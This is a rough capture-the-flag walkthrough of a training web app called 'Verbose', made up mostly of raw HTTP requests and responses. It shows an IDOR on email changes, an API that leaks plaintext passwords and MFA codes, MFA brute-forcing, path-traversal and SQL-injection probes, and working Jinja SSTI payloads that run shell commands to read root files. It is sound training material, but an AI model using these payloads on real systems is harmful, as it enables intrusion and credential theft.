---

Name: Verbose
Difficulty: Easy
URL: https://www.hacksmarter.org/events/7f9dc321-77ce-49b8-8acc-5c224ef25d8d/take/verbose-easy
Description: You have been authorized to perform an external penetration test against a target organization. During the initial reconnaissance phase, you identified a web application that allows unrestricted public user registration.

---

<!--TODO - clean the writeup-->
We can send messages
```http
POST /messages HTTP/1.1
Host: 10.1.17.168
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://10.1.17.168
Connection: keep-alive
Referer: http://10.1.17.168/messages
Cookie: session=eyJyb2xlIjoidXNlciIsInNlc3Npb25faWQiOiI1MmQ3ZDQwYy02MmU2LTRkYmYtODg1Ny1iNzRlZjNjY2E1ZmEiLCJ1c2VyIjoidGVzdCJ9.anWlCg.RocdL1WJgiVjablVa28zHxe8HFg
Upgrade-Insecure-Requests: 1
Priority: u=0, i

receiver=admin&content=test%0D%0A
```

We can update mail/ password

```txt
Email updated for User ID 5
```
```http
POST /profile HTTP/1.1
Host: 10.1.17.168
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: http://10.1.17.168
Connection: keep-alive
Referer: http://10.1.17.168/profile
Cookie: session=eyJyb2xlIjoidXNlciIsInNlc3Npb25faWQiOiI1MmQ3ZDQwYy02MmU2LTRkYmYtODg1Ny1iNzRlZjNjY2E1ZmEiLCJ1c2VyIjoidGVzdCJ9.anWjXQ.TDDDLm8u555-4dZ_Qw2aRmUQ1_o
Upgrade-Insecure-Requests: 1
Priority: u=0, i

action=update_email&user_id=5&email=wow%40gmail.com
```
I can just change the user_id to 10 and it still works

The password change deos not seem to be vulnerable to this
```bash
POST /profile HTTP/1.1
Host: 10.1.17.168
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://10.1.17.168
Connection: keep-alive
Referer: http://10.1.17.168/profile
Cookie: session=eyJyb2xlIjoidXNlciIsInNlc3Npb25faWQiOiI1MmQ3ZDQwYy02MmU2LTRkYmYtODg1Ny1iNzRlZjNjY2E1ZmEiLCJ1c2VyIjoidGVzdCJ9.anWjtg.yTE0J5YWyT_ED_qG28_6g0ZnJkY
Upgrade-Insecure-Requests: 1
Priority: u=0, i

action=update_password&new_password=pass
```

But we can try to change the email for user1, and than use the password reset feature

I've tried adding user_id to password update but it did not work
```bash
action=update_password&user_id=4&new_password=admin
```

In the page source I found
```html
<script>
    // Vulnerability: Overly Verbose Response / Sensitive Data Exposure
    // This requests the PATH '/api/users/all'. 
    // The browser receives the full JSON (with passwords), even though we only display names.
    fetch('/api/users/all')
        .then(response => response.json())
        .then(data => {
            const list = document.getElementById('user-status-list');
            list.innerHTML = '';
            
            const currentUser = 'test';
            
            data.forEach(user => {
                if(user.username !== currentUser) {
                    const item = document.createElement('div');
                    item.style.padding = '5px 0';
                    item.innerText = 'No messages from ' + user.username;
                    list.appendChild(item);
                }
            });
        })
        .catch(err => {
            console.error('Error fetching users:', err);
        });
</script>
```

At least we managed to change their emails, not sure why I didn't receive the forgot-password mail though
```bash
$ curl http://10.1.17.168/api/users/all | jq
[
  {
    "email": "test1@example.com",
    "id": 1,
    "mfa": null,
    "password": "basketball",
    "role": "user",
    "username": "tony"
  },
  {
    "email": "test2@example.com",
    "id": 2,
    "mfa": null,
    "password": "dolphin",
    "role": "user",
    "username": "johnny"
  },
  {
    "email": "test3@example.com",
    "id": 3,
    "mfa": null,
    "password": "YouWontGetThisPasswordYouNoobLOL123",
    "role": "admin",
    "username": "admin"
  },
  {
    "email": "test4@example.com",
    "id": 4,
    "mfa": null,
    "password": "liverpool",
    "role": "user",
    "username": "student"
  },
  {
    "email": "test@example.com",
    "id": 5,
    "mfa": null,
    "password": "admin",
    "role": "user",
    "username": "test"
  }
]
```

Let's login with the admin account and it's password

We are faced with a 2FA Verification screen which request a 4 digit number, we brute force it with Caido

```http
POST /mfa HTTP/1.1
Host: 10.1.17.168
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://10.1.17.168
Connection: close
Referer: http://10.1.17.168/mfa
Cookie: session=eyJtZmFfdXNlciI6ImFkbWluIiwic2Vzc2lvbl9pZCI6IjUyZDdkNDBjLTYyZTYtNGRiZi04ODU3LWI3NGVmM2NjYTVmYSJ9.anWptw.JwiKo7Fo3OtZDsFRLeSV8DIKO0M
Upgrade-Insecure-Requests: 1
Priority: u=0, i

code=2060
```
```http
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.5 Python/3.12.3
Date: Fri, 07 Aug 2026 09:54:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Vary: Cookie
Set-Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJzZXNzaW9uX2lkIjoiNTJkN2Q0MGMtNjJlNi00ZGJmLTg4NTctYjc0ZWYzY2NhNWZhIiwidXNlciI6ImFkbWluIn0.anWrRw.rcg1OmhAUX9VCJY7xDWL81C-Mmc; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

Or we could have made another request to /api/users/all since it also shows the mfa code
```bash
$ curl http://10.1.17.168/api/users/all | jq
[
  {
    "email": "test1@example.com",
    "id": 1,
    "mfa": null,
    "password": "basketball",
    "role": "user",
    "username": "tony"
  },
  {
    "email": "test2@example.com",
    "id": 2,
    "mfa": null,
    "password": "dolphin",
    "role": "user",
    "username": "johnny"
  },
  {
    "email": "test3@example.com",
    "id": 3,
    "mfa": "2060",
    "password": "YouWontGetThisPasswordYouNoobLOL123",
    "role": "admin",
    "username": "admin"
  },
  {
    "email": "test4@example.com",
    "id": 4,
    "mfa": null,
    "password": "liverpool",
    "role": "user",
    "username": "student"
  },
  {
    "email": "test@example.com",
    "id": 5,
    "mfa": null,
    "password": "admin",
    "role": "user",
    "username": "test"
  }
]


```

We can now upload files
```bash
Invalid File Type! Only PNG images allowed.
```

And promote users
```bash
Success: test is now admin.
```

This does not promote all users so it might not be SQLi
```bash
test' or 1=1; -- -
```
```http
POST /admin/make_admin HTTP/1.1
Host: 10.1.17.168
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://10.1.17.168
Connection: keep-alive
Referer: http://10.1.17.168/admin/dashboard
Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJzZXNzaW9uX2lkIjoiNTJkN2Q0MGMtNjJlNi00ZGJmLTg4NTctYjc0ZWYzY2NhNWZhIiwidXNlciI6ImFkbWluIn0.anWrkw.jSf_cdzyhgRldB_CDW3sz235Gvs
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=test&csrf_token=valid_token_123
```

```http
POST /admin/upload_logo HTTP/1.1
Host: 10.1.17.168
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----geckoformboundarydf6466ca51f28b51ce07d232aa290b38
Content-Length: 2752
Origin: http://10.1.17.168
Connection: keep-alive
Referer: http://10.1.17.168/admin/dashboard
Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJzZXNzaW9uX2lkIjoiNTJkN2Q0MGMtNjJlNi00ZGJmLTg4NTctYjc0ZWYzY2NhNWZhIiwidXNlciI6ImFkbWluIn0.anWrkw.jSf_cdzyhgRldB_CDW3sz235Gvs
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundarydf6466ca51f28b51ce07d232aa290b38
Content-Disposition: form-data; name="file"; filename="b64.txt"
Content-Type: text/plain

ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
CnRjcGR1bXA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWlyZWRvOio6MTgzODI6MDo5OTk5OTo3Ojo6
CmRuc21hc3E6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoK
dXNibXV4Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnJ0a2l0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnNz
aGQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKcG9zdGdyZXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYXZh
aGk6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3R1bm5lbDQ6IToxODM4MjowOjk5OTk5Ojc6OjoKc3Ns
aDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpubS1vcGVudnBuOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm5t
LW9wZW5jb25uZWN0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnB1bHNlOio6MTgzODI6MDo5OTk5OTo3
Ojo6CnNhbmVkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmluZXRzaW06KjoxODM4MjowOjk5OTk5Ojc6
OjoKY29sb3JkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmkycHN2YzoqOjE4MzgyOjA6OTk5OTk6Nzo6
OgpkcmFkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYmVlZi14c3M6KjoxODM4MjowOjk5OTk5Ojc6
OjoKZ2VvY2x1ZToqOjE4MzgyOjA6OTk5OTk6Nzo6OgpsaWdodGRtOio6MTgzODI6MDo5OTk5OTo3
Ojo6CmtpbmctcGhpc2hlcjoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEh
OjE4Mzk2Ojo6Ojo6Cl9ycGM6KjoxODQ1MTowOjk5OTk5Ojc6OjoKc3RhdGQ6KjoxODQ1MTowOjk5
OTk5Ojc6OjoKX2d2bToqOjE4NDk2OjA6OTk5OTk6Nzo6OgpjaGFybGllOiQ2JENaSm5DUGVRV3A5
L2pwTngka2hHbEZkSUNKbnI4UjNKQy9qVFIycjdEcmJGTHA4enE4NDY5ZDNjMC56dUtONHNlNjFG
T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg==

------geckoformboundarydf6466ca51f28b51ce07d232aa290b38--

```

We can preview the logo http://10.1.17.168/admin/logo_preview?file=logo.png, maybe it leads to LFi

trying http://10.1.17.168/admin/logo_preview?file=../../../../../../etc/passwd
returns Error: File 'passwd' not found.


THERE IS SSTI in the /messages
```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /root/root.txt').read()}}
```
<!--
eyJyb2xlIjoidXNlciIsInNlc3Npb25faWQiOiI1MmQ3ZDQwYy02MmU2LTRkYmYtODg1Ny1iNzRlZjNjY2E1ZmEiLCJ1c2VyIjoidGVzdCJ9.anWlCg.RocdL1WJgiVjablVa28zHxe8HFg

{
  "role": "user",
  "session_id": "52d7d40c-62e6-4dbf-8857-b74ef3cca5fa",
  "user": "test"
}

maybe i can change the role to admin, and use the none alg type
-->
